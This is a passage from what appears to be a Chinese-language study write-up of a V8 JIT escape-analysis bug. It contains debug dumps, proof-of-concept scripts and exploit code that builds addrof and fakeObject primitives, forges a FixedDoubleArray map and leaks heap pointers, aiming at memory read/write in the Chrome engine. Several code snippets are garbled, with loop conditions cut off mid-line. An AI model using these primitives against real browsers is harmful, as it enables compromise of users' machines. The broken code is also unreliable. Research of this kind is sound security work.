     - elements: 0x0c6e08148dc9  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x0c6e08042229  {
        0xc6e08044695: [String] in ReadOnlySpace: #length: 0x0c6e08242159  (const accessor descriptor)
     }
     - elements: 0x0c6e08148dc9  {
               0: 0x0c6e08148db9 
     }
    0xc6e0830394d: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 16
     - inobject properties: 0
     - elements kind: PACKED_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x0c6e08303925 
     - prototype_validity cell: 0x0c6e08242445 
     - instance descriptors #1: 0x0c6e082cba9d 
     - transitions #1: 0x0c6e082cbb19 Transition array #1:
         0x0c6e08044f85 : (transition to HOLEY_ELEMENTS) -> 0x0c6e08303975 
     - prototype: 0x0c6e082cb5e9 
     - constructor: 0x0c6e082cb385 
     - dependent code: 0x0c6e080421b5 
     - construction counter: 0
第二次
    Continuing.
    DebugPrint: 0xc6e08148dd5: [JSArray]
     - map: 0x0c6e0830394d  [FastProperties]
     - prototype: 0x0c6e082cb5e9 
     - elements: 0x0c6e08148dc9  [PACKED_ELEMENTS]
     - length: 1
     - properties: 0x0c6e08042229  {
        0xc6e08044695: [String] in ReadOnlySpace: #length: 0x0c6e08242159  (const accessor descriptor)
     }
     - elements: 0x0c6e08148dc9  {
               0: 0x0c6e08148db9 
     }
    0xc6e0830394d: [Map]
     - type: JS_ARRAY_TYPE
     - instance size: 16
     - inobject properties: 0
     - elements kind: PACKED_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - back pointer: 0x0c6e08303925 
     - prototype_validity cell: 0x0c6e08242445 
     - instance descriptors #1: 0x0c6e082cba9d 
     - transitions #1: 0x0c6e082cbb19 Transition array #1:
         0x0c6e08044f85 : (transition to HOLEY_ELEMENTS) -> 0x0c6e08303975 
     - prototype: 0x0c6e082cb5e9 
     - constructor: 0x0c6e082cb385 
     - dependent code: 0x0c6e080421b5 
     - construction counter: 0
##### 学习过程中的poc
###### poc1
    function opt(foo) {
       var a = [1.1]; //未逃逸
       foo(a); //逃逸
       return a[0];
    }
    //触发JIT编译
    for (var i=0;i{});
    }
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    %SystemBreak();
这个问题是，所有的代码全部被优化（通过--print-opt-code可以看出）
程序知道foo是要干什么，所以导致没有逃逸
###### poc2
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i{});
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    %SystemBreak();
这次进行了改进，程序只优化opt函数，但是没有触发源码中的断点
通过print-opt-code可以发现对于opt函数优化了两次
###### poc3
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i_map becomes invalidate here
       return a[0];//checkmap分支  because a->_map is nullptr, map doesn't MarkForDeletion()
    }
    opt((o)=>{});
    opt((o)=>{});
    opt((o)=>{});
    x = Array(0);
    print(opt((o)=>{o[0] = x;})); //在外部函数里改变类型
    %SystemBreak();
这个的结果是没有成功消除map值
具体的流程是
进行setvalue
进行map值的清空
清空之后到了消除kcheckmap的分支部分，发现条件不再满足
原因是上一步清空了
导致最后优化代码的几个部分
赋值a[0] = 1.1
    x84700085590    f0  49ba9a9999999999f13f REX.W movq r10,0x3ff199999999999a
    0x8470008559a    fa  c4c1f96ec2     vmovq xmm0,r10
    0x8470008559f    ff  c4c17b114007   vmovsd [r8+0x7],xmm0
最后取值a[0]的时候还是有checkmap
    0x847000855ee   14e  b801000000     movl rax,0x1
    0x847000855f3   153  49ba6041d2f6e77f0000 REX.W movq r10,0x7fe7f6d24160  (Call_ReceiverIsNullOrUndefined)    ;; off heap target
    0x847000855fd   15d  41ffd2         call r10
    0x84700085600   160  488b4dd8       REX.W movq rcx,[rbp-0x28]
    0x84700085604   164  41b8fd383008   movl r8,0x83038fd        ;; (compressed) object: 0x0847083038fd 
    0x8470008560a   16a  443941ff       cmpl [rcx-0x1],r8
    0x8470008560e   16e  0f8588010000   jnz 0x8470008579c  
###### poc4
    function opt(foo) {
       //触发JIT编译
       for (var i=0;i_map置为NUllptr, but a->_map is valid 
       return a[0];//checkMap分支  a'map MarkForDeletion()
    }
    //生成多个JIT模板
    for (var i=0;i{});
    }
    x = Array(0);
    print(opt((o)=>{o[0][0] = x;})); //在外部函数里改变类型
具体流程
storeFiled分支
default分支
这里同一个节点出现了四次
最后CheckMap分支
## 3 EXP
之间在8.0以上版本没有尝试过fake_obj之后的利用，同时这个也是chrome利用
addrof原语的思路是将指向一个对象的指针作为双精度浮点型数据读取的话，fakeobj是双精度浮点型数据解释为指向一个对象的指针
checkMap消除之后进行了直接赋值
先进行transiton后进行escape（优化流程图）
load-elimination ====> escape
在load-elimination有类型的变化(fixed_array与fixed_double变换)，在escape有checkMap消除
简单解释addrof
    function opt0(o) {
       for(var i = 0; i {o[0][0] = obj;});
       return u32f(addr) - 1;
    }
#### 3.1 fake_obj
脚本中用到了一个喷射object代码
    let arr = spary[spary_size-0x3];
    let arr_address = addressOf(arr);
    let proto_addr = addressOf(Array.prototype);
    %DebugPrint(arr);
    %DebugPrint(spary);
    %SystemBreak();
    //fake a FixedDoubleArray Map
    arr[0] = p64f(0x08042115,0x18040404);
    arr[1] = p64f(0x29000423,0x0a0007ff);
    arr[2] = p64f(proto_addr+1,0);
    //alert(arr_address.toString(16));
    let element_addr = arr_address + 0x14;
    let fake_element = element_addr+0x44;
    //fake a FixedDoubleArray
    arr[4] = p64f(0,element_addr+0x8+0x1);
    arr[5] = p64f(0x08042229,fake_element+1);
    arr[6] = p64f(0x7ffffffe,0);
    //fake a FixedDoubleArray's element
    arr[7] = p64f(0,0x08042ab1);
    arr[8] = p64f(0x7ffffffe,0);
    %SystemBreak();
    var arb_fixeddouble_arr = fakeObject(element_addr + 0x2c);
    //leak backing store
    backing_store_addr = u64f(arb_fixeddouble_arr[0x9]);
    heap_t_addr = u64f(arb_fixeddouble_arr[0xa])
    //alert(backing_store_addr.toString(16));
    //alert(heap_t_addr.toString(16));
    //leak compression ptr high byte
    compression_high_bytes = u32f(arb_fixeddouble_arr[0x20]);
    //alert(compression_high_bytes.toString(16));
    function addressOf_full(obj) {
       var addr = addressOf(obj);
       return (BigInt(compression_high_bytes) {
         for(var i = 0; i {},(o)=>{},fval);
       }
       return f((o)=>{o[0][0] = {};},(o)=>{return o[0][0];},fval);
    }
这里改了下脚本
    return f((o)=>{o[0][0] = {};},(o)=>{return o[0];},fval);
返回了b[0]，也就是a
从图中可以看到a被当作了fixed_array，然后具体的解释就是上面的部分了
##### 读取数据
前面费劲心思伪造了一个fake_double_array
下面就是使用它